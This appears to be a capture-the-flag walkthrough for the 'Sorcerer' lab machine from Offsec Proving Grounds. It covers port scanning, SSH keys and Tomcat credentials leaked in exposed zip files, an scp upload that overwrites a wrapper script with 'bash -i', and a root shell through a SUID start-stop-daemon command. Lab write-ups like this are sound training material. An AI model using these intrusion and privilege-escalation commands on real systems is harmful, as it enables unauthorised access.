# Sorcerer

## Info

Sorcerer is an intermediate linux machine from offsec proving grounds.

## Nmap

All tcp port scan.

```
22/tcp    open  ssh      syn-ack ttl 61 OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp    open  http     syn-ack ttl 61 nginx
111/tcp   open  rpcbind  syn-ack ttl 61 2-4 (RPC #100000)
2049/tcp  open  nfs      syn-ack ttl 61 3-4 (RPC #100003)
7742/tcp  open  http     syn-ack ttl 61 nginx
8080/tcp  open  http     syn-ack ttl 61 Apache Tomcat 7.0.4
37997/tcp open  nlockmgr syn-ack ttl 61 1-4 (RPC #100021)
41361/tcp open  mountd   syn-ack ttl 61 1-3 (RPC #100005)
50209/tcp open  mountd   syn-ack ttl 61 1-3 (RPC #100005)
50451/tcp open  mountd   syn-ack ttl 61 1-3 (RPC #100005)
```

## HTTP 7742

There is a directory containing zip files at the following url.

```
http://192.168.213.100:7742/zipfiles/
```

Each contains a home directory, unzipping max gives a ssh key and the following tomcat creds.

```
cat tomcat-users.xml.bak
```

```
tomcat:VTUD2XxJjf5LPmu6
```

## User

scp would not let me copy as the script output caused an error. Using the legacy option -O instead of sftp, I overwrite the bash script.

```
#!/bin/bash

bash -i
```

Upload to server.

```
scp -i max_id_rsa -O scp_wrapper.sh  max@192.168.213.100:/home/max
```

Sign in using ssh and get an interactive bash session.

```
ssh -i max_id_rsa max@192.168.213.100
```

## Root

There is a vulnerable SUID binary.

```
/usr/sbin/start-stop-daemon -n $RANDOM -S -x /bin/sh -- -p
```
